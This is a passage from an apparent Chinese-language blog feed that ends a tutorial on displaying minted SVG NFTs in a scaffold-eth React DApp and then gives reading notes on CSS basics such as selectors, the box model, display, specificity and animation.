this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Home</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">isSigner</span>=<span class="string">&#123;userSigner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">loadWeb3Modal</span>=<span class="string">&#123;loadWeb3Modal&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">yourCollectibles</span>=<span class="string">&#123;yourCollectibles&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">address</span>=<span class="string">&#123;address&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">blockExplorer</span>=<span class="string">&#123;blockExplorer&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">mainnetProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">tx</span>=<span class="string">&#123;tx&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">writeContracts</span>=<span class="string">&#123;writeContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">readContracts</span>=<span class="string">&#123;readContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml"> ...</span></span><br></pre></td></tr></table></figure><p>效果图为：</p><p><img src="https://user-images.githubusercontent.com/3297411/153822686-e7f7c3c7-65ee-4b1c-ade2-204c6365177f.png" alt="nft-display-list"></p><p>但是我们发现，当我们再次 mint 时，列表并不会更新，还是原来的样子，因此我们需要在 <code>App.jsx</code> 中添加事件监听，一旦我们铸造 NFT 之后，列表将刷新：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跟踪当前 NFT 数量</span></span><br><span class="line"><span class="keyword">const</span> balance = <span class="title function_">useContractReader</span>(readContracts, <span class="string">&quot;YourCollectible&quot;</span>, <span class="string">&quot;balanceOf&quot;</span>, [address]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🤗 balance:&quot;</span>, balance);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> yourBalance = balance &amp;&amp; balance.<span class="property">toNumber</span> &amp;&amp; balance.<span class="title function_">toNumber</span>();</span><br><span class="line"><span class="keyword">const</span> [yourCollectibles, setYourCollectibles] = <span class="title function_">useState</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 🧠 这个 effect 会在 balance 变化时更新 yourCollectibles </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">updateYourCollectibles</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> collectibleUpdate = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> tokenIndex = <span class="number">0</span>; tokenIndex &lt; balance; tokenIndex++) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;GEtting token index&quot;</span>, tokenIndex);</span><br><span class="line">        <span class="keyword">const</span> tokenId = <span class="keyword">await</span> readContracts.<span class="property">YourCollectible</span>.<span class="title function_">tokenOfOwnerByIndex</span>(address, tokenIndex);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tokenId&quot;</span>, tokenId);</span><br><span class="line">        <span class="keyword">const</span> tokenURI = <span class="keyword">await</span> readContracts.<span class="property">YourCollectible</span>.<span class="title function_">tokenURI</span>(tokenId);</span><br><span class="line">        <span class="keyword">const</span> jsonManifestString = <span class="title function_">atob</span>(tokenURI.<span class="title function_">substring</span>(<span class="number">29</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jsonManifestString&quot;</span>, jsonManifestString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> jsonManifest = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonManifestString);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jsonManifest&quot;</span>, jsonManifest);</span><br><span class="line">          collectibleUpdate.<span class="title function_">push</span>(&#123; <span class="attr">id</span>: tokenId, <span class="attr">uri</span>: tokenURI, <span class="attr">owner</span>: address, ...jsonManifest &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setYourCollectibles</span>(collectibleUpdate.<span class="title function_">reverse</span>());</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">updateYourCollectibles</span>();</span><br><span class="line">&#125;, [address, yourBalance]);</span><br></pre></td></tr></table></figure><p>此时，当我们再次 Mint 时，就是自动更新列表，显示最新铸造的 NFT 了。</p><h3><span id="zhan-shi-nft-he-yue-jie-kou-lie-biao">展示 NFT 合约接口列表</span></h3><p>这个功能比较简单，只需要修改对应 debug 部分即可：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Route</span> exact path=<span class="string">&quot;/debug&quot;</span>&gt;</span><br><span class="line">    &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment">          🎛 this scaffolding is full of commonly used components</span></span><br><span class="line"><span class="comment">          this &lt;Contract/&gt; component will automatically parse your ABI</span></span><br><span class="line"><span class="comment">          and give you a form to interact with it locally</span></span><br><span class="line"><span class="comment">      */</span>&#125;</span><br><span class="line"></span><br><span class="line">    &lt;<span class="title class_">Contract</span></span><br><span class="line">      name=<span class="string">&quot;YourCollectible&quot;</span></span><br><span class="line">      price=&#123;price&#125;</span><br><span class="line">      signer=&#123;userSigner&#125;</span><br><span class="line">      provider=&#123;localProvider&#125;</span><br><span class="line">      address=&#123;address&#125;</span><br><span class="line">      blockExplorer=&#123;blockExplorer&#125;</span><br><span class="line">      contractConfig=&#123;contractConfig&#125;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure><p>更新之后，可以在 <code>Debug Contracts</code> 菜单下看到合约的可以调用的函数。</p><p><img src="https://user-images.githubusercontent.com/3297411/153822741-30c8d3c6-077b-49b9-8b88-bc62119215cf.png" alt="contract-funcs"></p><p>至此，我们就完成了一个简单 NFT 铸造和展示的 DApp 了。</p><h2><span id="zong-jie">总结</span></h2><p>通过这个项目，我们可以学习并了解以下知识：</p><ol><li>NFT 合约基本内容以及如何在 Opensea 等市场中展示 NFT；</li><li>前端如何连接诸如 MetaMask 等钱包；</li><li>前端如何调用合约函数。</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      SVG NFT 全面实践 ── scaffold-eth loogies-svg-nft 项目完整指南
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CSS 基础──样式篇</title>
    <link href="https://qiwihui.com/qiwihui-blog-147/"/>
    <id>https://qiwihui.com/qiwihui-blog-147/</id>
    <published>2024-05-15T02:25:31.390Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>《<a href="https://lefex.github.io/books/html-book/introduction.html">前端小课──用好HTML</a>》的读书笔记。</p><h3><span id="shi-yong-css-san-chong-fang-shi">使用css三种方式</span></h3><ol><li><p>外部引入：通过 link 的方式引用 CSS 样式</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内部引入，在 HTML 中的 head 位置添加 style 标签</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内联样式</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: red; font-size: 18px;&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3><span id="kuai-ji-biao-qian-he-inline-biao-qian">块级标签和 inline 标签</span></h3><ul><li>块级标签独占一行；</li><li>inline 标签会「累加」，如同打字一样，一个字一个字往后拼接，单行显示不全会折行显示；<ul><li><code>white-space</code> 属性作用就是告诉浏览器遇到「空格」该如何处理，这里的空格不是单纯意义上的空格。<ul><li><code>normal</code></li><li><code>nowrap</code></li></ul></li></ul></li></ul><h3><span id="overflow-shu-xing"><code>overflow</code> 属性</span></h3><ul><li>控制对于超出可视区域的内容如何处理</li><li><code>overflow-x</code> ， <code>overflow-y</code></li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 默认值。内容不会被修剪，会呈现在元素框之外 */</span></span><br><span class="line"><span class="attribute">overflow</span>: visible;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内容会被修剪，并且其余内容不可见 */</span></span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内容会被修剪，浏览器会显示滚动条以便查看其余内容 */</span></span><br><span class="line"><span class="attribute">overflow</span>: scroll;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 由浏览器定夺，如果内容被修剪，就会显示滚动条（默认值） */</span></span><br><span class="line"><span class="attribute">overflow</span>: auto;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 规定从父元素继承overflow属性的值 */</span></span><br><span class="line"><span class="attribute">overflow</span>: inherit;</span><br></pre></td></tr></table></figure><h3><span id="qing-chu-biao-qian-mo-ren-bian-ju">清除标签默认边距</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清除标签默认边距*/</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="css-zhong-de-xuan-ze-qi">CSS中的选择器</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/129540047-12aa2048-3121-4d5d-a40d-c4d052a52bbc.png" alt="Untitled"></p><p>注意：写 CSS 代码的时候，即使某个属性写错，浏览器也不会报错，只会忽略无法识别的 CSS 样式。</p><ul><li><p>标签选择器： 如 <code>p</code> ， <code>li</code> 等</p></li><li><p>class 选择器：如 <code>.first</code></p></li><li><p>ID 选择器： <code>#firstid</code></p></li><li><p>通用选择器： <code>*</code> ，作用于所有的标签</p></li><li><p>属性选择器：根据属性来匹配HTML元素</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 匹配所有使用属性 &quot;lefe&quot; 的元素 */</span></span><br><span class="line"><span class="selector-attr">[lefe]</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*匹配所有使用属性为 &quot;lefe&quot;，且值为 liquid 的元素*/</span></span><br><span class="line"><span class="selector-attr">[lefe=<span class="string">&quot;liquid&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: goldenrod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*匹配所有使用属性为 &quot;lefe&quot;，且值包含 spicy 的元素*/</span></span><br><span class="line"><span class="selector-attr">[lefe~=<span class="string">&quot;spicy&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>类似于“正则表达式”的属性选择器，比如： <code>[attr^=val]</code> 匹配以 val 开头的元素， <code>[attr$=val]</code> ,匹配以 val 结尾的元素， <code>[attr*=val]</code> 匹配包含 val 的字符串的元素</p></li><li><p>伪选择器（pseudo-selectors）：它包含伪类（pseudo-classes）和伪元素（pseudo-elements）。这类选择器不是真正意义上的选择器，它作为选择器的一部分，起到选择器匹配元素的限定条件。</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 匹配超链接样式 */</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 访问后的状态 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标悬停、点击、聚焦时的样式 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: darkred;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>伪元素（pseudo-elements）选择器，它以“ :: ” 为标识符</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span>&#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">3em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Selects any &lt;p&gt; that is the first element</span></span><br><span class="line"><span class="comment">   among its siblings </span></span><br><span class="line"><span class="comment"> p:first-child 选择的是孩子节点中第一个元素是 p 的元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">color</span>: lime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>组合选择器（Combinators）: 这种选择器可以作用于多个 HTML 元素，有多种组合方式</p><ul><li><code>A B &#123;&#125;</code> : A 元素的所有后代元素 B 都会起作用。</li><li><code>A &gt; B &#123;&#125;</code> : A 元素的直接子节点会起作用，也就是只适用于 A 节点的第一层所有的子节点。</li><li><code>A + B &#123;&#125;</code> : 匹配 A 的下一个兄弟节点，AB具有相同的父节点，并且 B 紧跟在 A 的后面；</li><li><code>A ~ B &#123;&#125;</code> : B是 A 之后的任意一个（所有）兄弟节点。</li><li><code>A, B &#123;&#125;</code>：A 和 B 元素具有同一规则的 CSS 样式，不同元素使用逗号隔开。</li></ul></li></ul><h3><span id="wei-xuan-ze-qi">伪选择器</span></h3><ol><li><p>伪类选择器：作用是选中某个元素中符合某些条件的元素。作用于现有元素，相当于给现有元素添加某些属性。使用单个冒号 <code>:</code></p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">:first</span>-child</span><br><span class="line"><span class="selector-pseudo">:not</span></span><br><span class="line"><span class="selector-pseudo">:nth-child</span>()</span><br><span class="line"><span class="selector-pseudo">:only-child</span>()</span><br><span class="line"><span class="selector-pseudo">:root</span>()</span><br><span class="line"><span class="selector-pseudo">:disabled</span></span><br></pre></td></tr></table></figure></li><li><p>伪元素选择器：作用就是给现有元素添加某些新的内容，就好比给某个元素添加了一个新的标签，使用2个冒号 <code>::</code></p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">::first-letter</span> 表示对首字母进行操作</span><br><span class="line"><span class="selector-pseudo">::first-line</span> 对首行内容进行操作</span><br><span class="line"><span class="selector-pseudo">::before</span> 给已知元素的前面拼接新的内容</span><br><span class="line"><span class="selector-pseudo">::after</span> 给已知元素的后面拼接新的内容</span><br></pre></td></tr></table></figure></li></ol><h3><span id="gui-ze">@规则</span></h3><p>@规则在CSS中用于传递元数据、条件信息或其他描述性信息。它们以at符号（@）开头，后跟一个标识符来说明它是什么类型的规则，然后是某种类型的语法块，以分号（；）结尾。由标识符定义的每种类型的 at 规则都有其自己的内部语法和语义。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@charset</span> <span class="keyword">and</span> @import (metadata)</span><br><span class="line">@media <span class="keyword">or</span> @document (条件，嵌套申明)</span><br><span class="line">@font-face (描述信息)</span><br></pre></td></tr></table></figure><p>下面这个 CSS 只适用于屏幕超过 800px 的设备：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">801px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">800px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@media</code> 语法</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> mediaType <span class="keyword">and</span>|<span class="keyword">not</span>|<span class="keyword">only</span> (media feture) &#123;</span><br><span class="line">  // css</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="border">border</span></h3><ul><li>简写属性，包含 border-width, border-style, border-color。</li><li><code>border-width</code>：表示边框的宽度，可以分别设置上下左右边框为不同的宽度，比如 border-bottom-width；</li><li><code>border-style</code>: 表示边框的样式，可以分别设置上下左右边框为不同的样式，比如 border-bottom-style，可以取下面几种值：node、hidden、dotted、dashed、solid 等；</li><li><code>border-color</code>：表示边框的颜色，可以分别设置上下左右边框为不同的颜色。</li></ul><h3><span id="yi-xie-wen-zi-shu-xing">一些文字属性</span></h3><p>font-size: 文字大小；</p><p>font-weight：字重，字体粗细，可以这样理解吧；</p><p>color：字体颜色；</p><p>text-align：字体对齐方式；</p><p>text-decoration: 文字修饰，比如下划线，删除线；</p><p>letter-spacing: 文字间距；</p><p>line-height: 行高；</p><p>font-style:  文字样式，比如斜体；</p><h3><span id="he-zi-mo-xing">盒子模型</span></h3><p>两种盒子类型</p><ol><li>块级盒子（block）<ul><li>尽可能扩大可利用的空间</li><li>独占一行，也就说一个块级元素占一行</li><li>可以使用 width 和 height 属性</li><li>使用 padding、margin 和 border 会影响其它元素的位置</li></ul></li><li>行内盒子（inline）<ul><li>不会单行显示，除非一行没有足够多的空间，它会一个接一个地排列；</li><li>width 和 height 属性不起作用，如果给 span 标签设置 width 或 height 时，发现无效；</li><li>padding、margin 和 border 会起作用，但不会影响其它元素。</li></ul></li></ol><p>通过 <code>display</code> 修改盒子的显示方式</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.title</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>盒模型</p><p><img src="https://user-images.githubusercontent.com/3297411/129540095-2a436855-1b09-4423-9b72-1fdab450c68e.png" alt="Untitled 1"></p><ul><li>margin（外边距）：它表示盒子之间的距离，可以通过 margin-top、margin-bottom、margin-left、margin-right 来控制各个方向的边距，<strong>它们可以为负值</strong>；</li><li>border（边框）：表示盒子的边框；</li><li>padding（内边距）：表示与内容之间的距离；</li><li>content（内容）：表示内容的大小；</li></ul><p>模式</p><ol><li><p>标准的盒子模型</p><p>对于这种盒子模式，给它设置的 width 和 height 是 content 的宽高，当给盒子添加 padding 和 border 的时候，会增加盒子的整体大小。「外边距不会计入盒子的大小，它只是表示外部的边距」。</p></li><li><p>诡异盒子模型（The alternative CSS box model）</p><p>对于这种盒子模式，给它设置的 width 和 height 是盒子的宽高，也就是说内容 content 的宽需要减去 border 和 padding 的宽。</p></li></ol><p>谷歌浏览器默认的是标准的盒模型，可以通过：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br></pre></td></tr></table></figure><p>来修改盒模型为诡异盒模型。</p><h3><span id="display">display</span></h3><ol><li><p><code>display：inline</code></p></li><li><p><code>display：block</code></p></li><li><p><code>display：inline-block</code></p><p>这种布局方式结合了 inline 和 block 这两种元素的特性，它与块级元素不同的是：元素不会单独占用一行；相同的是：可以使用 width 和 height，可以通过 padding、margin 和 border 来控制元素的显示位置。</p><p>说白了就是除了不会单独占一行，其余的与块级元素一致。</p></li><li><p><code>display：none</code> 隐藏元素</p></li><li><p><code>display：flex</code> 一维</p></li><li><p><code>display：grid</code> 二维</p></li></ol><h3><span id="shi-yong-tu-pian">使用图片</span></h3><ol><li><p>设置背景图</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: antiquewhite;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;./logo_suyan.png&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-position</span>: center;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br></pre></td></tr></table></figure><ul><li>background-postion: 表示背景图的起始位置；<ul><li>background-postion： <code>top | left | bottom | right</code>，在某个边缘的位置，另一个维度为 50%。比如 top，背景图的起始位置为顶部，在X轴方向为 50%，居中显示；</li><li>background-postion：center，居中背景图；</li><li>background-postion：25% 75%，设置基于背景区域的开始位置，可以为负值；</li><li>background-postion-x：背景在 x 轴上的位置；</li><li>background-postion-y：背景在 y 轴上的位置；</li></ul></li><li>background-repeat: 背景的重复方式， <code>no-repat</code> 不重复， <code>repeat</code> 重复， <code>repat-x</code> X轴上重复，还有其它关键字。</li><li>background-size: 背景图的大小；</li></ul></li><li><p><code>img</code> 标签</p><p>行内（inline）元素</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./images/1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.logo</span> &#123;</span><br><span class="line"><span class="comment">/* 表示设置图片的宽度，如果只设置宽度，那么 img 标签的高度会根据图片的大小进行等比缩放。</span></span><br><span class="line"><span class="comment">       只设置高度也是同样的道理。</span></span><br><span class="line"><span class="comment">       如果即设置了高度又设置了宽度，那么图片的高度和宽度即为设置的宽高。 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="comment">/* 指定行内元素的垂直对齐方式 */</span></span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3><span id="xian-shi-duo-xing-wen-zi">显示多行文字</span></h3><p>text-overflow 和 -webkit-line-clamp</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.singal-line</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.two-line</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    -webkit-line-clamp: <span class="number">2</span>;</span><br><span class="line">    -webkit-box-orient: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>text-overflow：只对块级元素起作用，表示对超出指定区域的内容该如何显示</p><ul><li>ellipsis：以 … 省略号显示</li><li>clip截断显示</li></ul><p>-webkit-box：webkit 的 CSS 扩展属性</p><h3><span id="css-quan-chong">CSS权重</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/129540137-817a8c61-d9e3-4763-b984-b6a89f02f5de.png" alt="Untitled 2"></p><ul><li><code>*</code>：通用选择器，权重最低，就是 0，第 1 张图就是此意；</li><li>div、li&gt;ul、body：元素选择器，有几个值权重值就是几。li&gt;ul 是两个元素，&gt; 号不会干扰权重计算；第 2、3、4张图能看懂了吧，就是元素选择器，1个元素选择器就是 0-0-1，12个元素选择器就是 0-0-12；</li><li><code>.myClass, [type=chekbox], :only-of-type</code> : 类、属性、伪类选择器。第 5 张图，一个类选择器，权重值表示为 0-1-0；5-15张图能看懂了吧；</li><li><code>#myDiv</code>：id选择器，一条鲨鱼，权重比较高，权重值为 1-0-0；`</li><li><code>style</code>：权重值更高，权重值为 1-0-0-0；</li><li><code>!important</code>: 无敌，我是老大，告诉浏览器必须使用我定义的属性；</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/129540180-af9db964-ba31-4349-ba31-d271eba84078.png" alt="Untitled 3"></p><ul><li><code>g</code>：直接在元素中使用属性，权重最高，可以看做 1-0-0-0；</li><li><code>z</code>：id选择器，权重次子，可以看做 0-1-0-0；</li><li><code>y</code>：类、伪类、属性选择器，权重低，可以看做 0-0-1-0；</li><li><code>x</code>：元素、伪元素选择器，权重最低，可以看做 0-0-0-1；</li></ul><h3><span id="dong-hua">动画</span></h3><p>主要有两种方式</p><ul><li>animation：CSS动画，可设置不同帧的动效；</li><li>transition：这种属于过渡动画，也就是说在修改某些 CSS 属性的时候，属性会有一个渐变的过程。</li></ul><ol><li>animation</li></ol><ul><li>animation-name: 动画的名字，这个是通过 <code>@keyframes</code> 定义的名字。 <code>@keyframes</code> 指定某一帧的动画如何变化，可通过 % 来控制各个阶段的属性值</li><li>animation-duration：动画的持续时间；</li><li>animation-delay：动画开始时的延迟时间；</li><li>animation-iteration-count：动画循环次数；</li><li>animation-direction：动画的方向，比如 alternate 表示先正向后逆序，nomal 正向，reverse 逆序；</li><li>animation-timing-function：动画的时间曲线，它的值有 ease、ease-in、ease-out、ease-in-out、linear；</li><li>animation-fill-mode：动画执行后的填充模式，它的值有 forwards、backwards、none、both；</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.move-box-animation</span> &#123;</span><br><span class="line">    <span class="comment">/* animation: name duration timing-function delay iteration-count direction fill-mode; */</span></span><br><span class="line">    <span class="comment">/* 名字，为 @keyframes 的名字 */</span></span><br><span class="line">    <span class="attribute">animation-name</span>: move;</span><br><span class="line">    <span class="comment">/*  动画的时间 */</span></span><br><span class="line">    <span class="attribute">animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">    <span class="comment">/* 动画执行函数 */</span></span><br><span class="line">    <span class="attribute">animation-timing-function</span>: ease-in-out;</span><br><span class="line">    <span class="comment">/* 动画延迟时间 */</span></span><br><span class="line">    <span class="attribute">animation-delay</span>: <span class="number">1s</span>;</span><br><span class="line">    <span class="comment">/* 动画重复次数 */</span></span><br><span class="line">    <span class="attribute">animation-iteration-count</span>: <span class="number">10</span>;</span><br><span class="line">    <span class="comment">/* 动画的方向，先正向后逆向 */</span></span><br><span class="line">    <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    <span class="comment">/* 动画执行后的填充模式 */</span></span><br><span class="line">    <span class="attribute">animation-fill-mode</span>: backwards;</span><br><span class="line">    <span class="comment">/* 动画的运行状态 */</span></span><br><span class="line">    <span class="attribute">animation-play-state</span>: running;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> move &#123;</span><br><span class="line">    <span class="number">0%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">25%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 